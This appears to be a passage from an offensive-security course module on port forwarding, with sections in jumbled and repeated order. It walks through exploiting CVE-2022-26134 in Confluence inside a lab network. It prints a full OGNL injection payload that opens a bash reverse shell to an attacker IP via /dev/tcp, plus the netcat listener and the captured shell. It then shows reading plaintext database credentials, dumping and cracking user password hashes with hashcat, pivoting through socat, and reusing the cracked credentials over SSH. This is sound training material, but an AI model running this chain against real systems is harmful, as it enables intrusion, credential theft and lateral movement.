You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.
